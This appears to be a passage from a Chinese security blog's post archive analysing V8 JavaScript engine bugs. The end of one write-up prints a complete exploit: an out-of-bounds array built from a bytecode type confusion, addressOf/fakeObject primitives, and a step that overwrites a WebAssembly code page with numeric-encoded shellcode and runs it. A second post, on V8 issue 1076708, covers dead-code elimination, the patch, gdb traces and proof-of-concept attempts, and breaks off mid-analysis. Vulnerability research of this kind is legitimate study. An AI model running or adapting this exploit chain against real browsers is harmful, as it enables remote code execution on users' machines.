only works if configuration_ is not mutable.\n  if (!check_prototype_chain()) return true;\n  DisallowHeapAllocation no_gc;\n  if (*receiver_ == *holder_) return true;\n  if (!receiver_-&gt;IsJSReceiver()) return false;\n  JSReceiver current = JSReceiver::cast(*receiver_);\n  JSReceiver object = *holder_;\n  if (!current-&gt;map()-&gt;has_hidden_prototype()) return false;\n  // JSProxy do not occur as hidden prototypes.\n  if (object-&gt;IsJSProxy()) return false;\n  PrototypeIterator iter(isolate(), current, kStartAtPrototype,\n                         PrototypeIterator::END_AT_NON_HIDDEN);\n  while (!iter.IsAtEnd()) &#123;\n    if (iter.GetCurrent&lt;JSReceiver&gt;() == object) return true;\n    iter.Advance();\n  &#125;\n  return false;\n&#125;\n\n其中的if (!current-&gt;map()-&gt;has_hidden_prototype())条件具有随机性，我们来看一下它是怎么判断的\nBIT_FIELD_ACCESSORS(Map, bit_field3, has_hidden_prototype,\n                    Map::HasHiddenPrototypeBit)\n#define BIT_FIELD_ACCESSORS(holder, field, name, BitField)      \\\n  typename BitField::FieldType holder::name() const &#123;           \\\n    return BitField::decode(field());                           \\\n  &#125;                                                             \\\n  void holder::set_##name(typename BitField::FieldType value) &#123; \\\n    set_##field(BitField::update(field(), value));              \\\n  &#125;\n\n主要就是取出has_hidden_prototype这个位进行判断，其中MAP布局如下\n +---------------+---------------------------------------------+\n |   _ Type _    | _ Description _                             |\n +---------------+---------------------------------------------+\n | TaggedPointer | map - Always a pointer to the MetaMap root  |\n +---------------+---------------------------------------------+\n | Int           | The first int field                         |\n  `---+----------+---------------------------------------------+\n      | Byte     | [instance_size]                             |\n      +----------+---------------------------------------------+\n      | Byte     | If Map for a primitive type:                |\n      |          |   native context index for constructor fn   |\n      |          | If Map for an Object type:                  |\n      |          |   inobject properties start offset in words |\n      +----------+---------------------------------------------+\n      | Byte     | [used_or_unused_instance_size_in_words]     |\n      |          | For JSObject in fast mode this byte encodes |\n      |          | the size of the object that includes only   |\n      |          | the used property fields or the slack size  |\n      |          | in properties backing store.                |\n      +----------+---------------------------------------------+\n      | Byte     | [visitor_id]                                |\n +----+----------+---------------------------------------------+\n | Int           | The second int field                        |\n  `---+----------+---------------------------------------------+\n      | Short    | [instance_type]                             |\n      +----------+---------------------------------------------+\n      | Byte     | [bit_field]                                 |\n      |          |   - has_non_instance_prototype (bit 0)      |\n      |          |   - is_callable (bit 1)                     |\n      |          |   - has_named_interceptor (bit 2)           |\n      |          |   - has_indexed_interceptor (bit 3)         |\n      |          |   - is_undetectable (bit 4)                 |\n      |          |   - is_access_check_needed (bit 5)          |\n      |          |   - is_constructor (bit 6)                  |\n      |          |   - has_prototype_slot (bit 7)              |\n      +----------+---------------------------------------------+\n      | Byte     | [bit_field2]                                |\n      |          |   - is_extensible (bit 0)                   |\n      |          |   - is_prototype_map (bit 1)                |\n      |          |   - is_in_retained_map_list (bit 2)         |\n      |          |   - elements_kind (bits 3..7)               |\n +----+----------+---------------------------------------------+\n | Int           | [bit_field3]                                |\n |               |   - enum_length (bit 0..9)                  |\n |               |   - number_of_own_descriptors (bit 10..19)  |\n |               |   - is_dictionary_map (bit 20)              |\n |               |   - owns_descriptors (bit 21)               |\n |               |   - has_hidden_prototype (bit 22)           |\n |               |   - is_deprecated (bit 23)                  |\n |               |   - is_unstable (bit 24)                    |\n |               |   - is_migration_target (bit 25)            |\n |               |   - is_immutable_proto (bit 26)             |\n |               |   - new_target_is_base (bit 27)             |\n |               |   - may_have_interesting_symbols (bit 28)   |\n |               |   - construction_counter (bit 29..31)       |\n |               |                                             |\n +*************************************************************+\n | Int           | On systems with 64bit pointer types, there  |\n |               | is an unused 32bits after bit_field3        |\n +*************************************************************+\n | TaggedPointer | [prototype]                                 |\n +---------------+---------------------------------------------+\n | TaggedPointer | [constructor_or_backpointer]                |\n +---------------+---------------------------------------------+\n | TaggedPointer | If Map is a prototype map:                  |\n |               |   [prototype_info]                          |\n |               | Else:                                       |\n |               |   [raw_transitions]                         |\n +---------------+---------------------------------------------+\n | TaggedPointer | [instance_descriptors]                      |\n +*************************************************************+\n ! TaggedPointer ! [layout_descriptors]                        !\n !               ! Field is only present if compile-time flag  !\n !               ! FLAG_unbox_double_fields is enabled         !\n !               ! (basically on 64 bit architectures)         !\n +*************************************************************+\n | TaggedPointer | [dependent_code]                            |\n +---------------+---------------------------------------------+\n\n与MAP对象的内存对应起来\npwndbg&gt; p/x current\n$178 = &#123;\n  &lt;v8::internal::HeapObject&gt; = &#123;\n    &lt;v8::internal::Object&gt; = &#123;\n      static kHeaderSize = 0x0, \n      ptr_ = 0x61f6349ed01\n...................\npwndbg&gt; x /20gx 0x61f6349ed00\n0x61f6349ed00:  0x00002deae918ce19  0x0000317690b80c21\n...................\npwndbg&gt; x /20gx 0x00002deae918ce18\n0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003\n0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9\n..................\n\n可以看到，对应bit_field3的位置是一个对象指针，因此，bit_field3的字段具有随机性，是有几率可以满足条件的。这也说明了HolderIsReceiverOrHiddenPrototype是可以到达条件真的情况。多次运行后，达到条件，接下来就会进入SetDataProperty\n ► 2529         if (it-&gt;HolderIsReceiverOrHiddenPrototype()) &#123;\n   2530           return SetDataProperty(it, value);\n   2531         &#125;\npwndbg&gt; p it-&gt;HolderIsReceiverOrHiddenPrototype()\n$183 = true\n\nSetDataProperty函数如下\nMaybe&lt;bool&gt; Object::SetDataProperty(LookupIterator* it, Handle&lt;Object&gt; value) &#123;\n.....................\n  // Possibly migrate to the most up-to-date map that will be able to store\n  // |value| under it-&gt;name().\n  it-&gt;PrepareForDataProperty(to_assign);\n\n  // Write the property value.\n  it-&gt;WriteDataValue(to_assign, false);\n................\n&#125;\n\n主要是调用了it-&gt;WriteDataValue(to_assign, false);\nvoid LookupIterator::WriteDataValue(Handle&lt;Object&gt; value,\n                                    bool initializing_store) &#123;\n  DCHECK_EQ(DATA, state_);\n  Handle&lt;JSReceiver&gt; holder = GetHolder&lt;JSReceiver&gt;();\n  if (IsElement()) &#123;\n    Handle&lt;JSObject&gt; object = Handle&lt;JSObject&gt;::cast(holder);\n    ElementsAccessor* accessor = object-&gt;GetElementsAccessor();\n    accessor-&gt;Set(object, number_, *value);\n  &#125; else if (holder-&gt;HasFastProperties()) &#123;\n..................\n&#125;\n\n其中···accessor-&gt;Set(object, number_,*value);···最终调用到的函数是FixedArray::set\n   126 void FixedArray::set(int index, Object value) &#123;\n ► 127   DCHECK_NE(GetReadOnlyRoots().fixed_cow_array_map(), map());\n   128   DCHECK(IsFixedArray());\n   129   DCHECK_GE(index, 0);\n   130   DCHECK_LT(index, this-&gt;length());\n   131   int offset = kHeaderSize + index * kTaggedSize;\n   132   RELAXED_WRITE_FIELD(*this, offset, value);\n\n从上可以看出，这里SetDataProperty实质是将LookupIterator中的holder_强制当成一个FixedArray，然后往对应的elements写数据。于是，我们可以直接越界写arr对象的length，从而构造一个OOB数组。最终构造出的OOB POC（Release版本）\nfunction fun() &#123;\n   var f = (v1 = (function() &#123;\n      let a = 0;\n      let b = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;);\n         //修改fun的MAP为b\n         b = &quot;a&quot;.repeat(0x800);\n         //修改arr指针为a\n         a = [1.1,2.2,3.3];\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\nlet arr = &#123;&#125;;\n\nfunction fun2() &#123;\n   fun();\n&#125;\n\nfunction fun3() &#123;\n   fun();\n&#125;\n\nfun2();\n//%DebugPrint(fun);\n//%SystemBreak();\nfun3();\n\n//%DebugPrint(arr);\n//%SystemBreak();\n\nfun[0x12] = -1;\nprint(arr.length);\n\n漏洞利用function fun() &#123;\n   var f = (v1 = (function() &#123;\n      let a = 0;\n      let obj_arr = 0;\n      let arr_buf = 0;\n      let b = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;);\n         //修改fun的MAP为b\n         b = &quot;a&quot;.repeat(0x800);\n         //修改arr指针为a\n         a = [1.1,2.2,3.3];\n         obj_arr = [&#123;&#125;];\n         arr_buf = new ArrayBuffer(0x1000);\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\nlet arr = &#123;&#125;;\nlet obj_arr = &#123;&#125;;\nlet arr_buf = &#123;&#125;;\n\nfunction fun2() &#123;\n   fun();\n&#125;\n\nfunction fun3() &#123;\n   fun();\n&#125;\n\n//生成错误的字节码\nfun2();\n//执行错误的字节码\nfun3();\n\nfun[0x12] = -1;\nprint(&quot;[+] OOB length:&quot; + arr.length);\n\n/*%DebugPrint(arr);\n%DebugPrint(obj_arr);\n%SystemBreak();\n*/\n\nvar buf = new ArrayBuffer(0x8);\nvar dv = new DataView(buf);\n\nfunction p64f(value) &#123;\n   dv.setBigUint64(0,BigInt(value),true);\n   return dv.getFloat64(0,true);\n&#125;\n\nfunction u64f(value) &#123;\n   dv.setFloat64(0,value,true);\n   return dv.getBigUint64(0,true);\n&#125;\n\nfunction big2int(value) &#123;\n   dv.setBigUint64(0,BigInt(value),true);\n   return dv.getUint32(0,true);\n&#125;\n\nfunction addressOf(obj) &#123;\n   obj_arr[0] = obj;\n   return u64f(arr[0xe]) - 0x1n;\n&#125;\n\nfunction fakeObject(addr) &#123;\n   arr[0xe] = p64f(addr + 0x1n);\n   return obj_arr[0];\n&#125;\n\n\nvar wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);\nvar shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);\nvar wasmModule = new WebAssembly.Module(wasmCode);\nvar wasmInstance = new WebAssembly.Instance(wasmModule);\nvar func = wasmInstance.exports.main;\n\nvar wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x108n;\nprint(&quot;[+] wasm_shellcode_ptr_addr=&quot; + wasm_shellcode_ptr_addr.toString(16));\n\n/*%DebugPrint(arr);\n%DebugPrint(arr_buf);\n%SystemBreak();\n*/\n\narr[0x1c] = p64f(wasm_shellcode_ptr_addr);\nvar adv = new DataView(arr_buf);\nvar wasm_shellcode_addr = adv.getBigUint64(0,true);\nprint(&#39;[+] wasm_shellcode_addr=&#39; + wasm_shellcode_addr.toString(16));\n\narr[0x1c] = p64f(wasm_shellcode_addr);\n//替换wasm的shellcode\nfor (var i=0;i&lt;shellcode.length;i++) &#123;\n   adv.setUint32(i*4,shellcode[i],true);\n&#125;\n//执行shellcode\nfunc();\n\n\n0x03 感想通过这个漏洞，学习了V8的Iginition架构，对字节码的生成以及执行过程有了一定的了解，对虚拟机架构也有了一定的了解。对于IC缓存机制也有了一定的理解，这种方面的漏洞也是比较少见，牵涉到的知识面广，收获很多。\n0x04 参考理解 V8 的字节码「译」Ignition：V8解释器 「译」V8是如何执行JavaScript代码的？[Ignition: An Interpreter for V8BlinkOn]抛弃 V8 参数适配器框架：JavaScript 调用提速 40%的实践 FasterJavaScript calls V8 IginitionInterpreter &amp;&amp;IC v8cve-2019-5791:模块耦合导致的类型混淆Issue 926651: Security: [v8] Type Confusion inBuiltins_CallUndefinedReceiver1Handler\n","categories":["安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"Issues-1076708 漏洞分析","url":"/2021/08/05/issues-1076708/","content":"\n0x01 前置知识\nTerminate节点的生成\nDeadCode\nUnreachable节点的生成\n\n\n0x02 漏洞分析\npatch分析\n修复后的情况\nPOC分析\n其他问题\n漏洞利用\n\n\n0x04 补充\n0x05 小结\n0x06 感想\n0x07 参考\n\n0x01 前置知识Terminate节点的生成首先该漏洞与Terminate节点有关，那么我们先来研究一下Terminate节点是如何生成的。在代码目录中使用Visual Studio搜索common()-&gt;Terminate()，发现在src\\compiler\\bytecode-graph-builder.cc文件中有一处代码生成了Terminate节点\nvoid BytecodeGraphBuilder::Environment::PrepareForLoop(    const BytecodeLoopAssignments&amp; assignments,    const BytecodeLivenessState* liveness) &#123;  // Create a control node for the loop header.  Node* control = builder()-&gt;NewLoop();  …………………………………………………………  // Connect to the loop end.  Node* terminate = builder()-&gt;graph()-&gt;NewNode(      builder()-&gt;common()-&gt;Terminate(), effect, control);  builder()-&gt;exit_controls_.push_back(terminate);&#125;\n继续搜索该函数的调用BuildGraphFromBytecode-&gt;CreateGraph-&gt;VisitBytecodes-&gt;VisitSingleBytecode-&gt;BuildLoopHeaderEnvironment-&gt;PrepareForLoop，其中BuildLoopHeaderEnvironment中调用PrepareForLoop的条件如下\nvoid BytecodeGraphBuilder::BuildLoopHeaderEnvironment(int current_offset) &#123;  if (bytecode_analysis().IsLoopHeader(current_offset)) &#123;  .........................................    // Add loop header.    environment()-&gt;PrepareForLoop(loop_info.assignments(), liveness);  .........................................  &#125;\nIsLoopHeader的代码如下\nbool BytecodeAnalysis::IsLoopHeader(int offset) const &#123;  return header_to_info_.find(offset) != header_to_info_.end();&#125;\n即在header_to_info_中如果存在这个offset的话就判断通过，搜索header_to_info_的引用，发现在BytecodeAnalysis::PushLoop中有对header_to_info_进行插入\nvoid BytecodeAnalysis::PushLoop(int loop_header, int loop_end) &#123;  DCHECK(loop_header &lt; loop_end);  DCHECK(loop_stack_.top().header_offset &lt; loop_header);  DCHECK(end_to_header_.find(loop_end) == end_to_header_.end());  DCHECK(header_to_info_.find(loop_header) == header_to_info_.end());  int parent_offset = loop_stack_.top().header_offset;  end_to_header_.insert(&#123;loop_end, loop_header&#125;);  auto it = header_to_info_.insert(      &#123;loop_header, LoopInfo(parent_offset, bytecode_array_-&gt;parameter_count(),                             bytecode_array_-&gt;register_count(), zone_)&#125;);  // Get the loop info pointer from the output of insert.  LoopInfo* loop_info = &amp;it.first-&gt;second;  loop_stack_.push(&#123;loop_header, loop_info&#125;);&#125;\n继续查找BytecodeAnalysis::PushLoop的调用\nvoid BytecodeAnalysis::Analyze() &#123;  ........................  for (iterator.GoToEnd(); iterator.IsValid(); --iterator) &#123;    Bytecode bytecode = iterator.current_bytecode();    int current_offset = iterator.current_offset();    ....................        if (bytecode == Bytecode::kJumpLoop) &#123;      // Every byte up to and including the last byte within the backwards jump      // instruction is considered part of the loop, set loop end accordingly.      int loop_end = current_offset + iterator.current_bytecode_size();      int loop_header = iterator.GetJumpTargetOffset();      PushLoop(loop_header, loop_end);\n即在ByteCode中有Bytecode::kJumpLoop，就可以生成Terminate节点。根据名字，推测出Bytecode::kJumpLoop与循环有关，使用如下代码进行测试\nfor (var i=0;i&lt;0x1;i++) &#123;&#125;./d8 t.js --print-bytecode[generated bytecode for function:  (0x2ee80824ff85 &lt;SharedFunctionInfo&gt;)]Parameter count 1Register count 3Frame size 24         .................................................         0x2ee80825001b @   41 : 8a 15 00          JumpLoop [21], [0] (0x2ee808250006 @ 20)         0x2ee80825001e @   44 : 25 fb             Ldar r0         0x2ee808250020 @   46 : ab                Return Constant pool (size = 2)0x2ee80824ffc1: [FixedArray] in OldSpace - map: 0x2ee8080404b1 &lt;Map&gt; - length: 2           0: 0x2ee80824ffad &lt;FixedArray[1]&gt;           1: 0x2ee80808ab69 &lt;String[#1]: i&gt;Handler Table (size = 0)Source Position Table (size = 0)\n然后使用如下代码进行测试\nvar i = 1;while (i--) &#123;&#125;./d8 t.js --print-bytecode[generated bytecode for function:  (0x30f00824ff85 &lt;SharedFunctionInfo&gt;)]Parameter count 1Register count 3Frame size 24         ..............................................         0x30f008250018 @   38 : 8a 11 00          JumpLoop [17], [0] (0x30f008250007 @ 21)         0x30f00825001b @   41 : 25 fb             Ldar r0         0x30f00825001d @   43 : ab                Return Constant pool (size = 2)0x30f00824ffc1: [FixedArray] in OldSpace - map: 0x30f0080404b1 &lt;Map&gt; - length: 2           0: 0x30f00824ffad &lt;FixedArray[1]&gt;           1: 0x30f00808ab69 &lt;String[#1]: i&gt;Handler Table (size = 0)Source Position Table (size = 0)\n由此可以知道，只要是循环语句，就可以生成JumpLoop字节码，即使代码是无效的(deadcode)。\nwhile (deadcode) &#123;&#125;./d8 t.js --print-bytecode[generated bytecode for function:  (0x33390824ff99 &lt;SharedFunctionInfo&gt;)]Parameter count 1Register count 1Frame size 8         ...........................................         0x333908250000 @   10 : 8a 06 00          JumpLoop [6], [0] (0x33390824fffa @ 4)         0x333908250003 @   13 : 25 fb             Ldar r0   22 S&gt; 0x333908250005 @   15 : ab                Return Constant pool (size = 1)0x33390824ffc9: [FixedArray] in OldSpace - map: 0x3339080404b1 &lt;Map&gt; - length: 1           0: 0x33390824ff61 &lt;String[#8]: deadcode&gt;Handler Table (size = 0)Source Position Table (size = 8)0x333908250085 &lt;ByteArray[8]&gt;t.js:1: ReferenceError: deadcode is not definedwhile (deadcode) &#123;       ^ReferenceError: deadcode is not defined    at t.js:1:8\n现在，我们加入JIT，并分析其生成的IR图\nvar x = 0;for (var i=0;i&lt;0x20000;i++) &#123;   x += i;&#125;print(x);\n可以看到，确实生成了Terminate节点\nDeadCode在JS中出现语义错误的代码（变量未定义、函数未定义等），也是可以被加入JIT中编译的，并且有可以使用一种方法让解释器不报错，如下代码\nfunction opt() &#123;   x += i;&#125;opt();\n显然，x和i在在当前上下文中都没有定义，执行这段代码解释器直接报错，opt里的代码就叫做deadcode，我们在函数前加上一个async，就不会报错了，因为这变成异步函数了，解释器还来不及检查\nasync function opt() &#123;   x += i;&#125;opt();\n现在，加入JIT编译\nasync function opt() &#123;   x += i;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n发现也可以成功编译，并且在EscapeAnalysis阶段被标记为了Dead，这是由于在函数中分析出所有的变量都没有逃逸，因此直接确定为Dead了。现在将x外提，使得x发生逃逸\nvar x = 0;async function opt() &#123;   x += i;&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n这回没有发现Dead节点的生成。\nUnreachable节点的生成 Unreachable是一种节点，在本漏洞中也有用到，我们来分析一下，其是在DeadCodeElimination::ReduceEffectNode中生成的\nReduction DeadCodeElimination::ReduceEffectNode(Node* node) &#123;  DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());  Node* effect = NodeProperties::GetEffectInput(node, 0);  if (effect-&gt;opcode() == IrOpcode::kDead) &#123;    return Replace(effect);  &#125;  if (Node* input = FindDeadInput(node)) &#123;    if (effect-&gt;opcode() == IrOpcode::kUnreachable) &#123;      RelaxEffectsAndControls(node);      return Replace(DeadValue(input));    &#125;    Node* control = node-&gt;op()-&gt;ControlInputCount() == 1                        ? NodeProperties::GetControlInput(node, 0)                        : graph()-&gt;start();    Node* unreachable =        graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);    NodeProperties::SetType(unreachable, Type::None());    ReplaceWithValue(node, DeadValue(input), node, control);    return Replace(unreachable);  &#125;  return NoChange();&#125;\n其调用链如下DeadCodeElimination::Reduce-&gt;DeadCodeElimination::ReduceNode-&gt;DeadCodeElimination::ReduceEffectNode,DeadCodeElimination在多个阶段被调用，其中在TypedLoweringPhase就有被调用。\nstruct TypedLoweringPhase &#123;  DECL_PIPELINE_PHASE_CONSTANTS(TypedLowering)  void Run(PipelineData* data, Zone* temp_zone) &#123;    ....................    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);    ....................    graph_reducer.ReduceGraph();  &#125;&#125;;\n分析ReduceEffectNode的代码，首先得满足FindDeadInput(node)的条件，FindDeadInput(node)代码如下\nNode* FindDeadInput(Node* node) &#123;  for (Node* input : node-&gt;inputs()) &#123;    if (NoReturn(input)) return input;  &#125;  return nullptr;&#125;bool NoReturn(Node* node) &#123;  return node-&gt;opcode() == IrOpcode::kDead ||         node-&gt;opcode() == IrOpcode::kUnreachable ||         node-&gt;opcode() == IrOpcode::kDeadValue ||         NodeProperties::GetTypeOrAny(node).IsNone();&#125;\n为了弄清楚整个过程，我们使用如下代码测试\nasync function opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n首先使用--trace-turbo选项生成IR图，然后我们使用gdb进行调试。\ngdb ./d8set args ./t.jsr^Cb pipeline.cc:2437b DeadCodeElimination::ReduceEffectNodedis 2r\n其中pipeline.cc:2437处为  Run&lt;TypedLoweringPhase&gt;();，即我们在TypedLoweringPhase阶段断点，因为DeadCodeElimination在前面的阶段也有调用，所以得先让TypedLoweringPhase断下，然后开启断点2，并继续运行\nIn file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc   283   &#125;   284   return NoChange();   285 &#125;   286    287 Reduction DeadCodeElimination::ReduceEffectNode(Node* node) &#123; ► 288   DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());   289   Node* effect = NodeProperties::GetEffectInput(node, 0);   290   if (effect-&gt;opcode() == IrOpcode::kDead) &#123;   291     return Replace(effect);   292   &#125;   293   if (Node* input = FindDeadInput(node)) &#123;pwndbg&gt; p node-&gt;id()$3 = 6\n可以知道当前处理的上节点6，即对应图中的6: Checkpoint可以知道，其输入节点中没有满足FindDeadInput，继续运行，处理下一个节点，我们可以在满足条件if (Node* input = FindDeadInput(node))里下断点，然后继续运行\nb dead-code-elimination.cc:294dis 2c\n此时断下了\nIn file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc   289   Node* effect = NodeProperties::GetEffectInput(node, 0);   290   if (effect-&gt;opcode() == IrOpcode::kDead) &#123;   291     return Replace(effect);   292   &#125;   293   if (Node* input = FindDeadInput(node)) &#123; ► 294     if (effect-&gt;opcode() == IrOpcode::kUnreachable) &#123;   295       RelaxEffectsAndControls(node);   296       return Replace(DeadValue(input));   297     &#125;   298    299     Node* control = node-&gt;op()-&gt;ControlInputCount() == 1pwndbg&gt; p node-&gt;id()$2 = 87\n当前处理的节点是87那么就是说87: SpeculativeToNumber这个节点将被替换为Unreachable，这说明87: SpeculativeToNumber的inputs满足了FindDeadInput(node)的条件，进一步调试\npwndbg&gt; p input-&gt;opcode()$66 = v8::internal::compiler::IrOpcode::kCheckSmipwndbg&gt; p NodeProperties::GetTypeOrAny(input).IsNone()$67 = truepwndbg&gt; p input-&gt;id()$68 = 85\n可以知道是85: CheckSmi这个节点，由于推断出了其类型不属于Smi，因为我们的脚本中下标为0x100000000，因此这个输入节点是无效的。于是87节点被替换为了Unreachable节点，且新节点的标号为148。\nIn file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc   300                         ? NodeProperties::GetControlInput(node, 0)   301                         : graph()-&gt;start();   302     Node* unreachable =   303         graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);   304     NodeProperties::SetType(unreachable, Type::None()); ► 305     ReplaceWithValue(node, DeadValue(input), node, control);   306     return Replace(unreachable);   307   &#125;   308    309   return NoChange();   310 &#125;pwndbg&gt; p unreachable-&gt;id()$69 = 148\n这与TypedLowering阶段的IR图相吻合。\n0x02 漏洞分析patch分析diff --git a/src/compiler/dead-code-elimination.cc b/src/compiler/dead-code-elimination.ccindex f39e6ca..bab6b7b 100644--- a/src/compiler/dead-code-elimination.cc+++ b/src/compiler/dead-code-elimination.cc@@ -317,7 +317,10 @@          node-&gt;opcode() == IrOpcode::kTailCall);   Reduction reduction = PropagateDeadControl(node);   if (reduction.Changed()) return reduction;-  if (FindDeadInput(node) != nullptr) &#123;+  // Terminate nodes are not part of actual control flow, so they should never+  // be replaced with Throw.+  if (node-&gt;opcode() != IrOpcode::kTerminate &amp;&amp;+      FindDeadInput(node) != nullptr) &#123;     Node* effect = NodeProperties::GetEffectInput(node, 0);     Node* control = NodeProperties::GetControlInput(node, 0);     if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;\n从patch中可以知道，漏洞点出现在dead-code-elimination中的DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall函数\nReduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(    Node* node) &#123;  DCHECK(node-&gt;opcode() == IrOpcode::kDeoptimize ||         node-&gt;opcode() == IrOpcode::kReturn ||         node-&gt;opcode() == IrOpcode::kTerminate ||         node-&gt;opcode() == IrOpcode::kTailCall);  Reduction reduction = PropagateDeadControl(node);  if (reduction.Changed()) return reduction;  if (FindDeadInput(node) != nullptr) &#123;    Node* effect = NodeProperties::GetEffectInput(node, 0);    Node* control = NodeProperties::GetControlInput(node, 0);    if (effect-&gt;opcode() != IrOpcode::kUnreachable) &#123;      effect = graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);      NodeProperties::SetType(effect, Type::None());    &#125;    node-&gt;TrimInputCount(2);    node-&gt;ReplaceInput(0, effect);    node-&gt;ReplaceInput(1, control);    NodeProperties::ChangeOp(node, common()-&gt;Throw());    return Changed(node);  &#125;  return NoChange();&#125;\npatch修复的情况是不将Terminate节点替换为Throw节点，因此漏洞就发生在将Terminate节点替换为Throw以后。首先分析如何触发该代码路径，即当前node必须为Terminate，且其输入满足FindDeadInput(node)的条件。首先尝试如下代码\nasync function opt() &#123;   while (deadcode) &#123;   &#125;&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n发现其并没有被替换为Throw，这是因为Terminate的两个inputs均有效，不满足FindDeadInput的条件如果能够在Terminate节点之前添加一个Unreachable节点，那么进入ReduceDeoptimizeOrReturnOrTerminateOrTailCall函数时就能触发到漏洞点\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      while (deaddeaddead) &#123;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n此时发现Terminate节点不仅没有被替换为Throw节点，反而是被去除掉了。经过调试，发现Terminate节点在DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall函数中的PropagateDeadControl被消除了\nReduction DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall(    Node* node) &#123;  DCHECK(node-&gt;opcode() == IrOpcode::kDeoptimize ||         node-&gt;opcode() == IrOpcode::kReturn ||         node-&gt;opcode() == IrOpcode::kTerminate ||         node-&gt;opcode() == IrOpcode::kTailCall);  Reduction reduction = PropagateDeadControl(node);  if (reduction.Changed()) return reduction;  .................   81 Reduction DeadCodeElimination::PropagateDeadControl(Node* node) &#123;   82   DCHECK_EQ(1, node-&gt;op()-&gt;ControlInputCount());   83   Node* control = NodeProperties::GetControlInput(node); ► 84   if (control-&gt;opcode() == IrOpcode::kDead) return Replace(control);   85   return NoChange();   86 &#125;pwndbg&gt; p control-&gt;opcode()$40 = v8::internal::compiler::IrOpcode::kDeadpwndbg&gt; p node-&gt;id()$41 = 81pwndbg&gt; p node-&gt;opcode()$42 = v8::internal::compiler::IrOpcode::kTerminate\n可以知道，这里Terminate节点被消除的原因时因为他的控制流输入全都无效了,而对于Terminate节点，其有两个输入，一个是EffectPhi，另一个是LOOP，经过调试发生这两个节点都会被优化掉，究其原因是因为循环中的变量依赖过于简单，示例中，我们的条件是deaddeaddead，这个不存在的变量直接被判断无效，导致整个循环都会被优化去除。尝试将代码修改\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (obj) &#123;         dead(beef);      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n发现在Inlining阶段，代码就被标记为dead了，且LOOP节点也不见了因此继续更正我们的代码，使得至少循环语句是没有问题的\nfunction opt() &#123;   var a = new Uint8Array(10);   a[0x100000000] = 2;   async function deadcode() &#123;      const obj = &#123;&#125;;      while (1) &#123;         if (obj) &#123;             dead(beef);         &#125;      &#125;   &#125;   deadcode();&#125;for (let i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n这回在Inline阶段，Terminate和LOOP节点被保留了，但是在TypedLowering阶段，Terminate节点仍然被消除了，但是在实际调试中，ReduceDeoptimizeOrReturnOrTerminateOrTailCall函数中处理Terminate节点时，其输入节点并不全都是Dead状态，因此这回没有在ReduceDeoptimizeOrReturnOrTerminateOrTailCall中被消除，经过调试发现是在DeadCodeElimination::ReduceLoopOrMerge中被消除\nReduction DeadCodeElimination::ReduceLoopOrMerge(Node* node) &#123;  DCHECK(IrOpcode::IsMergeOpcode(node-&gt;opcode()));  Node::Inputs inputs = node-&gt;inputs();  DCHECK_LE(1, inputs.count());  // Count the number of live inputs to &#123;node&#125; and compact them on the fly, also  // compacting the inputs of the associated &#123;Phi&#125; and &#123;EffectPhi&#125; uses at the  // same time.  We consider &#123;Loop&#125;s dead even if only the first control input  // is dead.  .....................  &#125; else if (live_input_count == 1) &#123;      ......................      &#125; else if (use-&gt;opcode() == 